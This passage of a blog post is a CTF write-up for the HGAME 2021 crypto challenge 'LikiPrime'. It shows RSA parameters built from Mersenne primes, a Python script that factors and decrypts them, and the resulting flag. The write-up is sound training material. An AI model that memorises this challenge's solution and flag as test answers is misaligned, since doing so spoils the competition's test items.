class="line"></span><br><span class="line">m = s2n(flag)</span><br><span class="line">p = get_prime(secrets[<span class="number">0</span>])</span><br><span class="line">q = get_prime(secrets[<span class="number">1</span>])</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = pow(m, e, n)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"n = &#123;&#125;.format(n)"</span>)</span><br><span class="line">print(<span class="string">"e = &#123;&#125;.format(e)"</span>)</span><br><span class="line">print(<span class="string">"c = &#123;&#125;.format(c)"</span>)</span><br><span class="line"><span class="comment"># n = 658416274830184544125027519921443515789888264156074733099244040126213682497714032798116399288176502462829255784525977722903018714434309698108208388664768262754316426220651576623731617882923164117579624827261244506084274371250277849351631679441171018418018498039996472549893150577189302871520311715179730714312181456245097848491669795997289830612988058523968384808822828370900198489249243399165125219244753790779764466236965135793576516193213175061401667388622228362042717054014679032953441034021506856017081062617572351195418505899388715709795992029559042119783423597324707100694064675909238717573058764118893225111602703838080618565401139902143069901117174204252871948846864436771808616432457102844534843857198735242005309073939051433790946726672234643259349535186268571629077937597838801337973092285608744209951533199868228040004432132597073390363357892379997655878857696334892216345070227646749851381208554044940444182864026513709449823489593439017366358869648168238735087593808344484365136284219725233811605331815007424582890821887260682886632543613109252862114326372077785369292570900594814481097443781269562647303671428895764224084402259605109600363098950091998891375812839523613295667253813978434879172781217285652895469194181218343078754501694746598738215243769747956572555989594598180639098344891175879455994652382137038240166358066403475457</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"><span class="comment"># c = 445323254548873329885721188801318926642737754884401568756496644472843245677465663703387843749963097830314067820865731847842970298305099020093579182377484569002326615409944062300712945595773020905169705688031839100572998076363321079053952805318796102643352608287402007093283743228880494695033869579039892981439810428064509729472792613967364981458042306742686200082561726883562461447679550387120274794492747880290054011222098886367360442354929881088371526607012287851079083074560208579976769186285329542073057358288133754954919842408493158188199873118421697640164476531095307605028487303190189039832795985442018497747962944840331643386225425503373172945841018673838872789712943379939408444747867038492728406993616857911593396450293991399721294707359614542051163771464211496009265191119981490258580409311612346360409023913876972767585885744976317114385666166062891507618958833813198911238329841990759043598341708414040220735762883040993638644460941153431497095266102229350573633858580166112416244190834545648500224732375806985922274376678865173596610023989354278770080024426344279547975915879552059786102222717626129604106190223941117820805726050574092319271679868700348660069057593402947381424315337042032070745494827077153557521622552922359224136570814369270729591159917218701253687256249191798820184605208490042475678153731009371980340477254404850590</span></span><br></pre></td></tr></table></figure>
+
+<p>质数是由get_prime生成的，是2^n -1的形式，梅森素数。</p>
+<p>尝试通过在线网站分解，成功。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">658416274830184544125027519921443515789888264156074733099244040126213682497714032798116399288176502462829255784525977722903018714434309698108208388664768262754316426220651576623731617882923164117579624827261244506084274371250277849351631679441171018418018498039996472549893150577189302871520311715179730714312181456245097848491669795997289830612988058523968384808822828370900198489249243399165125219244753790779764466236965135793576516193213175061401667388622228362042717054014679032953441034021506856017081062617572351195418505899388715709795992029559042119783423597324707100694064675909238717573058764118893225111602703838080618565401139902143069901117174204252871948846864436771808616432457102844534843857198735242005309073939051433790946726672234643259349535186268571629077937597838801337973092285608744209951533199868228040004432132597073390363357892379997655878857696334892216345070227646749851381208554044940444182864026513709449823489593439017366358869648168238735087593808344484365136284219725233811605331815007424582890821887260682886632543613109252862114326372077785369292570900594814481097443781269562647303671428895764224084402259605109600363098950091998891375812839523613295667253813978434879172781217285652895469194181218343078754501694746598738215243769747956572555989594598180639098344891175879455994652382137038240166358066403475457</span></span><br><span class="line">p=<span class="number">2</span>**<span class="number">2203</span><span class="number">-1</span></span><br><span class="line">q=<span class="number">2</span>**<span class="number">2281</span><span class="number">-1</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">445323254548873329885721188801318926642737754884401568756496644472843245677465663703387843749963097830314067820865731847842970298305099020093579182377484569002326615409944062300712945595773020905169705688031839100572998076363321079053952805318796102643352608287402007093283743228880494695033869579039892981439810428064509729472792613967364981458042306742686200082561726883562461447679550387120274794492747880290054011222098886367360442354929881088371526607012287851079083074560208579976769186285329542073057358288133754954919842408493158188199873118421697640164476531095307605028487303190189039832795985442018497747962944840331643386225425503373172945841018673838872789712943379939408444747867038492728406993616857911593396450293991399721294707359614542051163771464211496009265191119981490258580409311612346360409023913876972767585885744976317114385666166062891507618958833813198911238329841990759043598341708414040220735762883040993638644460941153431497095266102229350573633858580166112416244190834545648500224732375806985922274376678865173596610023989354278770080024426344279547975915879552059786102222717626129604106190223941117820805726050574092319271679868700348660069057593402947381424315337042032070745494827077153557521622552922359224136570814369270729591159917218701253687256249191798820184605208490042475678153731009371980340477254404850590</span></span><br><span class="line">phin=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d=gmpy2.invert(e,phin)</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>hgame{Mers3nne~Pr!Me^re4l1y_s0+5O-li7tle!}</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/14/jarvisoj/" rel="next" title="jarvisoj">
+                <i class="fa fa-chevron-left"></i> jarvisoj
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/01/31/heap-wiki/" rel="prev" title="heap-wiki">
+                heap-wiki <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.jpg"
+                alt="caiii-vegtable" />
+            
+              <p class="site-author-name" itemprop="name">caiii-vegtable</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HGAME-2021"><span class="nav-text">HGAME 2021</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#week1"><span class="nav-text">week1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn"><span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#whitegive"><span class="nav-text">whitegive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#letter"><span class="nav-text">letter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto"><span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#まひと"><span class="nav-text">まひと</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc"><span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Base全家福"><span class="nav-text">Base全家福</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不起眼压缩包的养成的方法"><span class="nav-text">不起眼压缩包的养成的方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Galaxy"><span class="nav-text">Galaxy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Word-RE-MASTER"><span class="nav-text">Word RE:MASTER</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#week2"><span class="nav-text">week2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-1"><span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#note"><span class="nav-text">note</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-1"><span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#signin"><span class="nav-text">signin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gcd-or-more"><span class="nav-text">gcd or more</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WhitegiveRSA"><span class="nav-text">WhitegiveRSA</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-1"><span class="nav-text">misc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#week3"><span class="nav-text">week3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn-2"><span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#blackgive"><span class="nav-text">blackgive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#without-leak"><span class="nav-text">without_leak</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Library-management-System"><span class="nav-text">Library management System</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#todolist2"><span class="nav-text">todolist2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-2"><span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LikiPrime"><span class="nav-text">LikiPrime</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caiii-vegtable</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
